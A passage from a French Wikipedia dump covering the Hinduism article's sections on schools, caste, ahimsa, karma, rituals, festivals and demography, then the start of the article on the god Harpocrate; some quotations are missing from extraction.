Ainsi, le son, produit d'une façon prolongée, résultat de la combinaison de trois sons A-U-M (de la triade à l'unité), signifie « ce qui a été, est et sera », et possède, pour ceux qui se vouent à la méditation, une force à la fois magique et religieuse. Une "Upaniṣad" affirme :
Écoles et courants.
Des élaborations philosophiques, constituant la source de ce qu'on appelle aujourd'hui « hindouisme », ont été transmises oralement pendant des siècles et ont commencé à être transcrites dans la première moitié du millénaire Le système religieux et culturel qu'on appelle hindouisme s'est développé dans le sous-continent indien et n'est que rarement sorti de ses frontières.
Six grands systèmes philosophico-théologiques.
L'hindouisme a développé des "astika" antiques, ou écoles orthodoxes (car acceptant l’autorité des Vedas) de philosophie, ou "shaddarshana". Ces systèmes, ou « visions » ("darshana"), de l'hindouisme classique sont au nombre de six ; chacun d'entre eux est le fruit d'une longue élaboration dont témoigne une vaste littérature et ils sont tous de nature sotériologique, ayant pour but d'atteindre la libération, la délivrance des transmigrations (मोक्ष, mokṣa) :
Les "nâstika" ou écoles non-orthodoxes sont le jaïnisme, le bouddhisme, le sikhisme et le chârvâka, l'athéisme ancien classique de l’Inde ; elles ne reconnaissent pas l'autorité brahmanique du Véda.
Écoles et courants théistes.
Certains courants considèrent l’hindouisme comme une religion hénothéiste ou même panenthéiste. Les diverses divinités et avatars adorés par les hindous sont considérés comme différentes formes de l’Un, le dieu suprême ou "Brahman", formes adoptées qui seules sont accessibles à l’homme (on prendra garde à ne pas confondre "Brahman", l’être suprême et la source ultime de toute énergie divine, et Brahma, le créateur du monde).
Ce chemin vers la connaissance suprême orthodoxe ("jnanamarga"), prôné par les six écoles hindouistes, reste le privilège d'une élite intellectuelle restreinte, le croyant populaire mélangeant souvent tous ces courants de pensée. Toutefois, trois grands courants théistes de l'hindouisme se démarquent de façon relativement importante dans toutes les couches de la population : le vishnouisme, le shivaïsme et le shaktisme. À l'intérieur de ces courants, de nombreuses écoles se sont développées, qui se différencient surtout par leur interprétation des rapports existant entre Être suprême, conscience individuelle et monde, ainsi que des conceptions ésotériques qui en dérivent. Les textes védiques (Vedas, Upanishads, etc.) constituent une référence pour les trois courants, même si chacun d'entre eux les complète par les textes (Purana-s, "Gita"-s, etc.) qui leur sont propres. Ces textes ne s'excluent pas, car l'hindouisme admet la coexistence de voies différentes vers le salut (Moksha). Ainsi le choix d'un courant n'implique pas le rejet des autres.
L'hindouisme comporte plusieurs branches, les principales étant :
Chacun de ces cultes se pratique avec les mêmes moyens philosophiques ou de "yoga", ce sont leurs méthodes qui diffèrent. Ces dénominations ne devraient pas être considérées comme des « Églises », parce qu'il n'y a aucun dogme central dans l'hindouisme, et les croyances individuelles sont toujours respectées. D'ailleurs, une importante majorité des hindous modernes peut ne pas se considérer comme appartenant à une dénomination précise.
, estimant que Vishnou personnalise le Brahman, le vénérant souvent par le biais, entre autres, des deux avatars de Vishnou, Râma et Krishna. Les hindous non-vishnouïtes sont le plus souvent des Shivaïtes (surtout localisés dans le Sud de l'Inde), qui considèrent Shiva ou ses fils comme le(s) représentant(s) du Brahman ; les autres assimilent la Shakti au Brahman, "Ishvari" ou la déesse Kâlî/Durga. Mais, bien souvent, le croyant hindou possède chez lui les représentations de plusieurs de ces formes de Dieu (Ishvara).
Rishabha dans l'hindouisme.
Rishabhanatha (« Seigneur Taureau »), ou Rishabha (« Taureau »), est l'un des vingt-deux avatars de Vishnou dans la "Bhagavata Purana". Certains chercheurs affirment que cet avatar représente le premier Tirthankara du jaïnisme du même nom.
Bouddha dans l'hindouisme.
Dans l'hindouisme, Bouddha est considéré dans certaines branches comme un Avatar de Vishnou. Dans les textes pouraniques, il est le vingt-quatrième des vingt-cinq avatars, préfigurant une prochaine incarnation finale. Un certain nombre de traditions hindoues parlent du Bouddha comme du plus récent des dix avatars principaux connus sous le nom de Dashâvatar (Dix Incarnations de Dieu), précédant l'avatar à venir Kalkî.
Croyances, rituels et pratiques communes.
Quatre buts de la vie (purushartha).
En parallèle des quatre périodes de la vie hindoue, l'hindouisme considère qu'il existe quatre buts à l'existence ou "pouroushârtha". Les désirs des vivants, de l'Être-monade ("Pourousha"), étant naturels, chacun de ces buts sert à parfaire la connaissance de l'Être puisque, par l'éveil des sens et sa participation au monde selon des principes vertueux et sociaux, il en découvre les principes. Cependant, selon la théorie hindoue, l'être humain doit se garder d'en être charmé ou de faire d'un de ces buts un absolu isolé, sous peine d'errer sans fin dans le cycle du samsâra ; dans le "Niralamba Upanishad", on précise que la volonté de l'homme qui se voue à atteindre exclusivement le "moksha" renforce la servitude et l'éloigne de ce but suprême : « La servitude, c'est aussi envisager de se consacrer exclusivement à la poursuite de la libération ("moksha") ».
Ces vers de Kâlidâsa résument parfaitement cette pensée :
Quatre étapes de la vie (ashrama).
La vie spirituelle d'un hindou est traditionnellement divisée en quatre stades ou "âshrama". Ces quatre stades sont étroitement liés aux quatre buts de la vie, chacun de ces stades permettant d'atteindre au mieux ces buts. Cette rigueur permettait d'accéder à une vie spirituelle bien remplie.
Société brahmanique, les quatre varnas (système de caste).
La société hindoue a été depuis traditionnellement divisée à partir de ces quatre grandes classes, basées sur la place que l'homme a dans le rituel védique et la profession :
Ces classes sont dénommées "varna" (« couleur ») et le système a été appelé "Varna Vyavastha". Le système de "varna" est une partie intégrante de l'hindouisme, et il est strictement sanctionné par les textes du Véda. Les textes de la "Smriti" (y compris les "Lois de Manu") ont élaboré les règles de ce système. La "Bhagavad-Gita" résume précisément ces distinctions :
Évolution du système de castes.
Le système de castes basé sur la naissance, qui existe en Inde moderne, n'existait pas dans l'hindouisme védique antique. Un hymne célèbre du Veda indique ainsi :
Précédemment, le système était seulement basé sur la profession, la place dans le rituel védique et le caractère, et il y a toujours eu des exemples où les gens ont librement changé de profession et se sont librement inter-mariés.
Selon Jean Herbert, .
Ce système fut fixé sur la naissance au début du Moyen Âge indien. Ainsi, avec l'évolution de plusieurs sous-castes (avec une classe des intouchables hors du Varna Vyavastha), le système a évolué vers le système de castes comme nous le connaissons aujourd'hui.
Avec la modernisation, les différences des quatre castes traditionnelles demeurent sans avoir de poids autre que symbolique dans l'Inde contemporaine, mais, en revanche, s'amplifient et aggravent les tensions pour le contrôle des richesses, surtout au sein de la multitude des basses castes, dont les Intouchables (Dalit).
L'anthropologue Robert Deliège rappelle ainsi :
Explication théologique.
Le système des varnas s'explique théologiquement : dans l'hindouisme, on considère que la société sacrée est organisée selon l'équilibre du "dharma" (en sachant que l'épouse/parèdre de "Dharma déva", dieu de l'Ordre sacré, est "Ahimsâ dévî", déesse de l'universelle Non-violence, tous deux parents du Dieu-Roi Vishnu ; lorsque le "dharma" s'affaiblit, lorsque la violence envers les créatures gagne du terrain et que la déesse Terre, "Bhu dévi", est en danger , Vishnu se fait justement avatâr, « descente » de Dieu sur Terre, pour tuer les démons fautifs qui engendrent le désordre cosmique, nient les divins parents de Vishnu et ce faisant font souffrir les vies, afin de redonner aux brâhmanes leur place primordiale qui maintient l'harmonie universelle où les autres "varna" sont tous respectueux de leur ordre, ). Cette organisation sacrée permet la régulation des rapports entre les hommes et de définir les actes qui leur incombent, afin de ne pas laisser prospérer l'orgueil, du moins au niveau communautaire. Ce souci d'équilibre a une origine doctrinale, car elle répond à la symbolique des "gunas", ou qualités/saveurs. Aux trois "gunas" correspondent des couleurs (le noir, le rouge et le blanc) qui sont chacune associées à un varna. À l'origine, l'hindou ne naît pas dans un varna : il s'insère dans celle-ci en fonction du rôle qu'il est amené à jouer et des responsabilités qui lui reviendront. Beaucoup de textes mythologiques dénoncent l'usurpation du titre de brâhmane par certains personnages qui, sous couvert de la naissance, profitaient d'un statut valorisant sans s'acquitter de leurs devoirs. 
Ce faisant, selon la philosophie samkhya, la qualité principale du Brâhmane est le sattva, la qualité lumineuse harmonieuse de la connaissance transcendant le rajas (qualité active) et le tamas (qualité de l'ignorance passive), celle du kshatriya
est principalement un mélange de sattva et de rajas (ce dernier étant la qualité crépusculaire et dynamique faisant passer du sattva au tamas, ou l'inverse), celle du vaishya est un mélange de rajas et de tamas, et celle du shudra est principalement du tamas, qualité obscure et lourde de non-connaissance venant du moi (ce qui explique pourquoi même les enfants de Brâhmanes sont "shudra" tant qu'ils n'ont pas reçu l'initiation védique : la connaissance brahmanique doit tuer la tendance naturelle de l'ego à obscurcir la conscience).
La croyance hindoue soutient que ce système est « naturel », qu'on le retrouve dans le règne animal (fourmis, abeilles et les mammifères vivant en troupeaux) et dans l'organisation familiale (respect et autorité des parents et ancêtres), comme dans la société. En effet, l'hindouisme ne fait pas de différence entre culture et nature : le dharma, devoir de chaque être, est une « loi naturelle », et l'humanité n'est pas vue en tant qu'entité homogène chargée de soumettre le monde et les autres êtres, mais nécessairement plurielle et vouée à se transformer, comme l'explique Michel Angot :
Du point de vue hindou, ce système serait évolutif et s'adapterait avec la société ; ainsi :
Il existerait ainsi une distinction entre le système tel qu'il serait exprimé par les textes et son application courante. Aurobindo écrit : 
Il est possible d'être rejeté de sa caste (surtout les brâhmanes, qui ont beaucoup plus de devoirs à honorer et de purifications à maintenir que le simple "shudra", à qui l'on demande seulement de respecter et de servir l'autorité brahmanique et ceux qui la protègent — par la force physique (si l'on est kshatriya) ou par la richesse matérielle (si l'on est vaishya ou shudra), mais, pour cela, les fautes de l'individu doivent être relativement graves. . Perdre sa caste peut être douloureux pour un hindou, puisque vivre au sein d'une communauté soudée offre un certain nombre d'avantages et de protections.
Ahimsâ (la non-violence), le régime végétarien et la vache sacrée.
L'hindouisme prescrit des devoirs universels, tels que pratiquer l'hospitalité, s'abstenir de blesser les êtres vivants ou non-violence ("ahimsa"), exercer l'honnêteté ("asteya"), la patience, la tolérance, le contrôle de soi, la compassion ("karuna"), la charité ("dāna") et la bienveillance ("kshama"), entre autres vertus.
"Ahimsâ", « épouse » ou shakti du primordial Dharma (« Devoir »), est un concept qui recommande la non-violence et le respect pour toute vie, humaine et animale, et même végétale (voir les Bishnoï). "Ahimsâ" est assez souvent traduit par "non-violence". En fait, ce terme signifie, dans son sens exact, "non-nuisance à l'égard de tous les êtres vivants" ou "respect de la vie sous toutes ses formes". Dans un sens positif, ou actif, l'ahimsâ est synonyme de compassion, de générosité. La racine sanskrite est "hims" (« nuire ») avec le préfixe privatif « a ». L'ahimsâ est fondé sur une injonction védique :
Mais le terme "ahimsâ" apparaît pour la première fois dès les Oupanishads et dans le Raja-Yoga, c'est le premier des cinq "yamas", ou vœux éternels, les restrictions indispensables du yoga. Les textes sacrés brahmaniques insistent beaucoup sur le fait que l'Ahimsâ et toutes les valeurs qui en découlent (amitié équanime, charité, abnégation altruiste, etc.) sont l'éthique incontournable et fondamentale.
Cette pratique non violente dans l'hindouisme est en lien étroit avec le végétarisme et la doctrine de la réincarnation des âmes qui pousse à voir comme un égal à soi-même tout ce qui vit ; à ce sujet, Bhishma dit dans le Mahâbhârata :
La croyance en la réincarnation est fondamentale dans le bouddhisme, le jaïnisme et l'hindouisme : nous avons été, nous sommes et nous serons (peut-être) tous des animaux au cours de nos innombrables vies. En réalité, selon l'hindouisme, du fait qu'il y a une infinité d'univers et que le cycle des réincarnations est "sans commencement", tous les végétaux et animaux sont tous d'anciens humains qui n'ont pas réussi à accéder au Nirvâna. Naître humain est donc vu comme une chance rare à ne pas gaspiller en désirs et actes égoïstes qui se noient dans le "samsara".
L'Ahimsâ est la notion philosophique de l'hindouisme (mais aussi du bouddhisme ou du jaïnisme) qui introduit le végétarisme comme norme dans l'alimentation. D'après certaines estimations, 85 % de la population hindoue suit un régime végétarien (pas de viande, de poisson ni d'œufs ; les œufs non fécondés sont considérés comme aliments non végétariens, en Inde) : surtout dans les communautés orthodoxes de l'Inde du Sud, dans certains États du Nord comme le Gujarat ou du Sud au Karnataka (où l'influence des jaïns est significative). Ce régime alimentaire est principalement fondé sur une nourriture à base de laitages et produits verts. Quelques-uns évitent même l'oignon et l'ail, qui sont considérés comme ayant des propriétés "rajas", c'est-à-dire « passionnelles ». Dans l'Inde traditionnelle, un brahmane n'était rien sans sa vache, car elle lui fournissait l'offrande aux dieux la plus appréciée. Le "svadharma" (le dharma personnel) des brahmanes inclut le végétarisme, le brahmane étant appelé à mener une vie absolument pure (le Mahâbhârata déclare à ce sujet : ). L'hindouisme encourage le végétarisme. La consommation de viande, de poisson (et d'œufs fécondés) n'est pas promue, seulement tolérée, dans le cadre du rang que l'hindouisme lui a assigné dès les Védas : inférieur, non respectueux de l'ahimsâ et impur par rapport à un régime végétarien.
Certains brahmanes sont non seulement végétariens, mais végétaliens, c'est-à-dire qu'ils ne consomment aucun produit d'origine animale (lait, etc.).
D'une façon générale, les Upanishads déjà (à partir du ), soulignent que les bêtes et les humains sont semblables, puisque tous hébergent en eux l'âtman, et de ce fait sont les sanctuaires du Brahman (« Absolu », la plus haute notion de Dieu, dans l'hindouisme). C'est précisément parce que tous les êtres vivants sont le sanctuaire du Brahman qu'il n'y a pas en Inde de temple du Brahman, comme il y a des temples de Vishnou ou de Shiva.
On peut constater que, dans la plupart des villes saintes hindoues, il existe une interdiction de tous les aliments non-végétariens et de tous les alcools, et . Par le port "rituellement approprié" des grains appelés "rudrâksha", on peut se libérer de ce type de péché (entre autres). À ce propos, on peut lire dans le "Shiva-purâna" : .
La plupart des hindous voient la vache comme le meilleur représentant de la bienveillance de tous les animaux , elle est vénérée comme une mère. La vache est le symbole du pouvoir du brâhmane et de l'Ahimsâ.
Cycle de la vie.
Karma et réincarnation.
Le mot "karma" signifie « action ». L'hindou croit en une vie après la mort et avant la naissance, le corps n'étant qu'une enveloppe matérielle temporaire. Le gourou Yājñavalkya enseignait qu'à sa mort chaque homme subissait une dissolution ; le corps retournait à la terre, le sang à l'eau, le souffle au vent, la vue au soleil et l'intellect à la lune, mais les « actions non rémunérées » (celles qu'on a produites sans en récolter les conséquences) se réunissaient pour s'incarner de nouveau en un être. De cette façon, la notion, présente dans les "Upanishads", de la transmigration des âmes (ou "jiva", c'est l'atman - qui, lui, est purement immatériel - "dans" ou "avec" le corps organique) et de leur renaissance, se joignait à celle du "karma" (littéralement, l'« action »). Cependant, selon l'anthropologue Robert Deliège, la croyance en la réincarnation n'est pas uniformément ancrée en Inde, il y a des variations selon les populations, les milieux sociaux, les régions.
Le karma était à l'origine le seul acte rituel ; mais par la suite, considéré comme moteur du samsâra, il est identifié à toute action déterminant de façon automatique non seulement la renaissance après la mort, mais aussi les formes de cette future existence et la situation que l'individu connaîtra dans sa nouvelle vie.
En d'autres termes, l'homme devient ce qu'il accomplit ; les bonnes actions d'une existence antérieure améliorent les conditions de vie de l'existence à venir, tandis que de mauvaises actions les aggravent : .
Aussi chaque individu détermine-t-il par la loi de maturation des actes son propre destin dans la vie à venir, le « théâtre » de son fruit renouvelé (il n'est pas question de récompense ou de punition, puisqu'il n'y a personne pour récompenser ou punir).
Par ailleurs, dans cette succession "sans commencement" d'existences en tant que créatures mortelles, l'âtman demeure l'essence invariable, indivisible, indestructible et propre à tout être vivant, malgré sa mutation permanente à travers le temps, représentant ainsi la continuité du moi au sein de la migration des âmes, .
Les différentes écoles de philosophie indienne enseignent plusieurs voies pour parvenir à la libération (moksha) de l'âme. À travers notamment la pratique du yoga, l'hindou peut choisir entre une variété de chemins tels que la dévotion (bhakti yoga), l'action désintéressée (karma yoga), la connaissance (jnana yoga) ou la méditation (raja yoga). La voie du bhakti yoga est la plus pratiquée car plus facile d'accès que les autres.
Corps.
Selon Jean Herbert : .
Rituels.
Les pratiquants effectuent de nombreux rituels qui leur permettent au quotidien d'exprimer et de rythmer leurs vies religieuses. Au-delà des rituels, ils passent de longues heures à méditer et se consacrer à leur divinité (devata).
Les rituels peuvent être des offrandes, des purifications (ablutions, jeûne), la récitation de mantras ou de prières. Parmi les cérémonies, on peut citer la puja (rite quotidien) et le homa.
Les rituels peuvent se faire dans les temples (mandir), mais les pratiquants ont aussi chez eux une section consacrée, un autel, pour la réalisation de leurs rituels.
Temples.
Les temples hindous ("mandir" en hindi, "koyil" en tamoul) ont hérité des rites et des traditions riches et anciennes, et ont occupé une place particulière dans la société hindoue. Ils sont d'habitude dédiés à une divinité primaire, appelée la divinité tutélaire, et à d'autres divinités subalternes associées à la divinité principale. Cependant, quelques temples sont dédiés aux multiples divinités. La plupart des temples majeurs sont construits par les "agama-shastras" et beaucoup sont des sites de pèlerinage. Pour beaucoup d'hindous, les quatre "shankaracharyas", fonctionnaires religieux chargés de donner des conseils religieux (les abbés des monastères de "Badrinath", "Puri", "Sringeri" et "Dwarka" et parfois un cinquième, celui de "Kanchi") sont considérés par les hindous comme les quatre plus hauts patriarches. Le temple est un lieu pour le darshan (la vision de l'être-divin), pour la "pūjā" (le rituel), la méditation, parmi les autres activités religieuses. La "pūjā", ou adoration, utilise fréquemment l'aide d'une "mūrti" (la statue ou l'icône dans laquelle la présence divine est invoquée) conjointement avec des chants ou des mantras. La vénération de ces murtis est faite tous les jours dans un temple.
Point sur le Svastika.
 Le swastika est un signe bénéfique, d'origine très ancienne. Il se retrouve dans de nombreuses civilisations et symbolise la révolution du soleil et les forces cosmiques. Tourné vers la droite, il est lié à l'Ordre brahmanique, au "Dharma", et représente le jour ; tourné vers la gauche, il est lié au Temps qui s'écoule au sein de la Nature/"Prakriti" et représente la nuit et la déesse Kâlî ; on l'appelle alors "sauvastika". Sa composition en 4 branches, branches dépendantes les unes des autres pour former l'unité harmonieuse du tout bien équilibré, est le symbole même des 4 buts de la vie (Kâma, Artha, Dharma et Moksha), des 4 "Vedas", des 4 "varna" (Brâhmane/enseignant, Kshatriya/défenseur, Vaishya/paysan-artisan et Shudra/serviteur) et des 4 périodes de la vie. Avec ses 4 branches qui convergent vers un même point, le "bindu", il symbolise aussi le chiffre 5, avec les 5 éléments dont le "bindu" représente l'éther, la source de la création, et, par extension, le Nirvâna, état de l'être où l'on n'est plus soumis aux forces opposées de la Nature, transcendant les différentes catégories de créatures dépendant de tel ou tel conditionnement physique qu'incarnent les 5 éléments. Enfin, le "svastika" exprime à lui seul une maxime védique enseignant la pluralité nécessaire des points de vue en ce qui concerne l'approche de la vérité (« Vérité », qui est, dans l'hindouisme, un des noms de Dieu) : "Ekam sat anekâ panthâ", « la vérité est une, les chemins sont multiples », le "bindu" central (des quatre branches réunies du svastika) exprimant la vérité (ou l'Être) unique que l'on peut toujours approcher par divers chemins de connaissance, même si l'origine de ces chemins est différente, inverse (chemins de savoir interdépendants représentés par les quatre ramifications du svastika). Du fait de ce poids symbolique très important, qui va bien au-delà d'un simple aspect décoratif, le svastika se trouve être une forme sacrée relativement omniprésente dans le monde hindou.
Dimension sociale.
Définition et différence de l'hindouisme et de l'Hindutva par la Cour suprême de l'Inde.
En 1966 et en 1995, la Cour suprême de l'Inde, afin de savoir si l’utilisation de l’Hindutva dans les campagnes électorales pouvait être considérée comme une pratique de corruption au sens de l’article 123 de la loi sur la représentation du peuple, a décidé de différencier l'hindutva (idéologie politique) et l'hindouisme (religion), et ainsi a défini le cadre de la « foi hindoue »comme suit :
Alors que l'hindutva est défini en tant que concept politique qui va au delà de la religion, englobant des aspects culturels, sociaux et politiques de la vie en Inde et incluant les autres religions indiennes comme le jaïnisme, le bouddhisme et le sikhisme.
Médecine.
Par le biais essentiellement des brahmanes, l'Inde a développé un type de médecine traditionnelle (qui se veut en accord avec les conceptions métaphysiques de la religiosité hindoue), nommée "Ayurvéda", ce qui signifie en sanskrit « longue vie » ; elle est basée sur l'étude des pulsations cardiaques du patient, de ses humeurs fondamentales ("dosha"), de sa façon de vivre (en particulier ses choix moraux) et de s'alimenter et même, aussi, de penser, conception du corps et de l'esprit globalisante illustrée par ces proverbes sanskrits :
Michel Angot, néanmoins, met en garde contre les interprétations occidentales et "new age" de l'Ayurvéda (interprétations fallacieuses nombreuses, en Inde même), proposées par un milieu non savant (et ne connaissant pas le sanskrit) du fait de leur « non-brahmanitude », de leur méconnaissance (relative ou totale) des règles éthiques fondamentales à respecter pour prétendre être un médecin ayourvédique (brâhmane-guérisseur), méconnaissance d'autant plus fâcheuse que l'Ayurvéda est d'abord un savoir théorique représentatif de volontés philosophiques aboutissant à la pleine santé de tout un chacun, vu comme un être responsable de ses actes/"karma".
Danse.
Véritable art rituel, la danse classique indienne naît dans les temples.
Plusieurs siècles avant l'ère chrétienne, les grands sanctuaires utilisent les talents des jeunes danseuses.
Artistes sacrées, elles sont attachées au temple, portent le nom de "devadasi" (« esclaves de dieu »), et participent aux cérémonies d’offrandes et d'adoration.
Lorsque, plus tard, la danse sera pratiquée à la cour des princes, elle conservera cette inspiration religieuse.
L'Inde classique a connu deux grands types de danse :
Environnement.
L'environnement dans l'hindouisme a une grande importance. "Sanâtana-dharma" renvoie à la conception d'une essence éternelle du cosmos, la qualité qui lie tous les êtres humains, animaux et végétaux à l'univers alentour et éventuellement à la source de toute existence.
Cette perspective se retrouve clairement dans les "Lois de Manu" (qui indiquent les moyens de se purifier d'actes impurs), où l'on indique plusieurs fois que l’"ahimsa" (« non-violence ») ne concerne pas seulement le règne animal, mais aussi le règne végétal et l'environnement de manière générale : On y indique ainsi que celui qui a rendu impure l'eau, d'une quelconque manière que ce soit, doit pratiquer l'aumône pendant un mois pour se purifier de cette mauvaise action/"karma" ; que celui qui blesse, même sans volonté de nuire, des arbres fruitiers et d'autres végétaux divers, doit, toujours pour se purifier, répéter cent prières du Rig-Véda ou suivre toute une journée une vache en signe d'humilité et ne s'alimenter que de son lait. Ces mesures purificatoires sont là pour rappeler que l'environnement, les végétaux et les éléments naturels (comme l'eau, etc.), sont à respecter, car ils sont aussi l'émanation du "Brahman" (« Âme universelle ») : les détruire ou blesser à bien des conséquences karmiques néfastes que l'on doit éviter ou éliminer par une quelconque ascèse.
Les "Bishnoïs" (ou "Vishnoï") sont les membres d'une communauté créée par le gouroû "Jambeshwar Bhagavan", appelé communément "Jambaji" (1451-?), surtout présente dans l'État du Rajasthan, majoritairement dans les régions de Jodhpur et de Bîkâner, et dans une moindre mesure dans l'État voisin de l'Haryana en Inde.
Les Bishnoïs suivent vingt-neuf principes édictés par leur gouroû et se caractérisent par leur végétarisme, leur respect strict de toute forme de vie (non-violence, "ahimsa"), leur protection des animaux ainsi que des arbres, leur adoption d'une tenue vestimentaire particulière. On les définit souvent comme ayant une forte conscience écologique. Les Bishnoïs vivent paisiblement dans des villages isolés loin des centres de peuplement et sont environ sept millions en Inde. Ils font partie des hindous qui enterrent leurs morts, (les sadhus, sannyasins, yogis, sont eux aussi enterrés), du fait que l'on ne puisse couper du bois d'arbre vivant pour réaliser la crémation.
Fêtes.
Les fêtes occupent une place visible et incontestable dans la pratique de la religion hindoue. Excepté les fêtes les plus populaires, comme celle de Holî, de la naissance de Krishna ou de Divālī, la fête des lumières, qui sont célébrées dans toute l'Inde, la plupart des célébrations ont une importance surtout locale.
Habituellement, le déroulement de la fête est centré sur un grand char richement orné portant les images des divinités du temple, et qui est tiré à travers le village ou la région tout entière.
L'une des fêtes les plus connues est celle qui se tient à Puri (en Orissa) en l'honneur de Krishna-Vishnou, qui représente à cette occasion les figures de "Jaqannatha" (« seigneur du monde »), de son frère "Balarama" et de sa sœur "Soubhadra".
On peut également citer "Janmâshtami", « huitième jour de naissance », fête de la nativité de Krishna, au mois d'août. Une poupée représentant Krishna bébé est placée dans une crèche, autour de laquelle la famille veille une partie de la nuit en récitant des invocations et en chantant. Le jeûne est souvent observé à l'occasion de cette cérémonie.
Prohibition de l'inceste.
L'inceste est considéré comme un des péchés les plus graves, au sein de l'hindouisme, au même titre que le meurtre du brâhmane ; interdire à l'étudiant brahmanique de coucher avec l'épouse de son propre guru (le « maître » védique), considéré comme un "père" (spirituel) dans la culture indienne, découle de cet interdit absolu de l'inceste : le propre du "chandala", du « mangeur de chien » ou paria, est de ne pas respecter cet interdit, entre autres .
Ainsi, mythologiquement, le dieu démiurge Brahmâ, à l'origine doté de cinq têtes, fut décapité de sa tête incestueuse par Shiva-Bhairava (le « Bon Terrible »), pour avoir osé penser posséder sexuellement sa propre « fille » (car née de son mental), la déesse de la connaissance, des sciences et des arts, Sarasvatî, déesse toujours vêtue de blanc, comme une veuve, et considérée par les hindous comme une vierge éternelle célibataire .
Bénarès est la ville où Shiva, dieu du yoga, s'est lavé du sang produit par la décapitation de la tête incestueuse de Brahmâ ; de là vient la haute sacralité de cette ville selon les croyances hindoues.
L'homosexualité dans l'hindouisme.
Dans l'hindouisme, le plaisir n'est pas perçu comme un mal : c'est un don de Dieu. Le péché de la chair n'existe pas comme dans le judaïsme ou le christianisme, et de nombreuses sculptures sensuelles voire érotiques sur les parois externes des temples sont là pour en témoigner. Le plaisir charnel est accepté et acceptable dans la mesure où il est né d'un consentement mutuel et d'une attirance réciproque (que cette attirance soit hétérosexuelle ou homosexuelle), et même s'il n'est pas consommé dans les liens du mariage (le "Kâma-Sûtra", ouvrage sacré de l'hindouisme dédié à l'éros, fait place aux pratiques homosexuelles et adultères, avec de nombreux conseils de prudence). Comme en Europe, différentes époques ont apporté divers degrés de tolérance, mais faire de l'hindouisme (ou brahmanisme) et de ses religions-sœurs (sikhisme, jaïnisme, bouddhisme, etc.) un havre homophile serait un contresens, puisque l'islam domina le sous-continent pendant cinq siècles, remplacé par la pudibonderie du colonisateur britannique.
En effet, le kama-sutra, écrit par le brâhmane et ascète Vatsyayana, ne dénonce en aucun cas l'homosexualité, mais au contraire en décrit les vertus et les actes, sans aucun tabou de principe.
Enfin, les homosexuels sont considérés par l'hindouisme orthodoxe comme « bénis des Dieux », puisque leur éros est "pur" : non souillé de préoccupation de type social ou lié à la « famille » (l'éros, ou "kâma", est un des quatre buts des créatures, avec le gain matériel ("artha"), le devoir ou vertu ("dharma"), et la libération du cycle des réincarnations ("moksha")) ; en effet, l'éros des hétérosexuels est "impur" puisque pouvant engendrer des enfants ; or, faire des enfants qui n'ont pas leur place dans la société est un très grave péché qui entache les parents, dans l'hindouisme ; les homosexuels, avant l'ère islamique en Inde, n'ont jamais eu à souffrir du moindre reproche de la part des brâhmanes, bien au contraire.
Démographie et géographie.
L'Inde, le Népal et l'île Maurice sont des nations majoritairement hindouistes. En Inde, l'hindouisme représente quelque (en 2013) soit 78 % de la population, et plus de 1 milliard de croyants en 2021. Jusqu'en mai 2006, le Népal était le seul État dans le monde dont la religion officielle était l'hindouisme, avant que le Parlement proclame le principe de laïcité dans ce pays, ce qui ne change rien en soi pour la pratique religieuse, puisque l'hindouisme, qui a plusieurs branches différentes, n'a aucune Église officielle à laquelle un quelconque État peut s'associer).
Depuis le , une diaspora indienne s'est constituée. Ainsi, on trouve actuellement des minorités hindouistes notables dans les pays suivants (selon une estimation de 2010, sauf mention contraire) : le Bangladesh (11,7 à 13,5 millions) l'Indonésie (4 millions), le Sri Lanka (2,8 millions), les États-Unis (1,8 million), la Malaisie (1,7 million), le Pakistan (1,3 à 3,3 millions, en 1997, et 8,6 millions en 2017), l'île Maurice (0,7 million), l’Afrique du Sud (0,6 million) le Royaume-Uni (0,8 million), la Birmanie (0,8 million) le Canada (0,5 million), l'Australie (0,3 million), la Trinité-et-Tobago (0,3 million), Singapour (0,26 million), les Fidji (0,24 million), le Guyana (0,2 million), le Suriname (0,1 million) L'hindouisme se répand notamment en Afrique, non par le biais seul d'une diaspora indienne, mais par l'adhésion des Africains eux-mêmes, notamment au Ghana et au Togo (l'hindouisme est la religion à la plus forte croissance au Ghana).
Certains États comme le Bangladesh et le Sri Lanka abritent une importante minorité hindoue : cela est dû au fait que ces États constituaient une partie de l'Inde avant la partition de 1947. Au Sri Lanka, la minorité tamoule (majoritairement composée d'hindous, mais aussi de chrétiens et de musulmans) a subi un génocide organisé par les nationalistes cinghalais voulant un pays peuplé uniquement de bouddhistes (comme le fit le nationalisme bouddhiste birman contre les Rohingyas) : c'est le sujet du livre "The Tamil Genocide by Sri Lanka" de Francis Anthony Boyle. Comme au Pakistan, la minorité hindoue au Bangladesh a subi de (comme les ) ; ces violences et persécutions au Bangladesh sont le sujet du célèbre livre "Lajja" de Taslima Nasreen.
L’Asie du Sud-Est a été largement convertie à l'hindouisme depuis le . Il en reste un grand nombre de monuments, comme en témoignent la ville-temple d’Angkor Vat au Cambodge ou les temples de l'île de Java en Indonésie, ainsi que la grande popularité des épopées du Mahabharata et du Ramayana. L'influence dans la danse est moins évidente. L’île indonésienne de Bali est ainsi marquée par une forte influence hindoue, avec des éléments bouddhistes et surtout un animisme local, indonésien (mais qui se réfère à la trimurti), le syncrétisme étant plus facile dans ces cultures ; l'hindouisme brahmanique était à sa façon lui aussi un « animisme », mais toujours basé sur des philosophies systématiques universelles et non des croyances éparses, non classifiées et à tendance tribale. La culture javanaise est encore fortement imprégnée d'éléments indiens, et il reste des enclaves d'hindouisme à Java. La Thaïlande et l'Indonésie ont comme armoiries nationales Garuda, le véhicule de Vishnou, que l'on retrouve dans le nom de la compagnie aérienne nationale, Garuda Indonesia.

</doc>
<doc id="1410" url="https://fr.wikipedia.org/wiki?curid=1410" title="Harpocrate">
Harpocrate

Harpocrate (en grec ancien Ἁρποκράτης / "Harpokratês") est dans la mythologie grecque un dieu enfant, adaptation de la divinité égyptienne Horus enfant.
Dans les grandes mythologies antiques.
Égypte hellénistique.
Dans la mythologie égyptienne, Harpocrate désigne Horus enfant, fils d'Isis et d'Osiris. C'est sous ce nom que le dieu Horus fut adoré à Alexandrie d'abord, puis dans tout le monde gréco-romain, à côté d'Isis, de Sarapis et d'Anubis. Ce nom n'est qu'une forme hellénisée des mots égyptiens « Har-pokhrat », qui signifient « Horus l'enfant ».
Rome antique.
Dans la mythologie romaine, Harpocrate existait en tant que divinité d'un culte à mystères. Représenté portant l'index à la bouche en un geste enfantin, son attitude fut mal interprétée par les auteurs classiques qui y virent une marque de silence. Il porte traditionnellement au cou une bulla.
